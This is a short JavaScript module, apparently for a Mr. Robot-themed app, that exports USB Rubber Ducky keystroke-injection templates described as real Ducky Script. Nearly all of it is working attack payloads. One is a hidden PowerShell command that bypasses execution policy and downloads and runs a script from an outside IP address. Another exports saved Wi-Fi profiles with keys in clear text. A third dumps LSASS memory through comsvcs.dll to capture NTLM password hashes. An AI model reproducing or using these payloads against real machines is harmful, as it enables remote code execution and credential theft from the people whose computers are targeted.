/**
 * MR. ROBOT: USB RUBBER DUCKY ATTACK PAYLOAD BUILDER
 * Generates and compiles real Ducky Script syntax with simulated USB keystroke injection
 */

export const DUCKY_PAYLOAD_TEMPLATES = {
  reverse_shell: {
    name: 'REVERSE_TCP_INJECTOR',
    target: 'Windows 11 Remote Core',
    script: `REM TARGET: Windows 11 Powershell Bypass
DELAY 500
GUI r
DELAY 250
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.240.12.88:8443/payload.ps1')"
ENTER
REM INJECTION COMPLETE // PERSISTENT SERVICE HOOKED`
  },
  wifi_dump: {
    name: 'WLAN_CREDENTIAL_EXTRACTOR',
    target: 'WPA2/WPA3 Keyring Store',
    script: `REM TARGET: Extract Saved WLAN Profiles
DELAY 500
GUI r
DELAY 200
STRING cmd /c netsh wlan export profile folder=C:\\Users\\Public\\ key=clear
ENTER
REM KEYS DUMPED TO C:\\Users\\Public\\`
  },
  sam_dump: {
    name: 'LSASS_CREDENTIAL_HARVESTER',
    target: 'NTLM Password Hashes',
    script: `REM TARGET: Dump LSASS Memory Pages
DELAY 600
GUI r
DELAY 300
STRING rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\Users\\Public\\lsass.dmp full
ENTER
REM MEMORY SNAPSHOT COMMITTED // NTLM HASHES CAPTURED`
  }
};
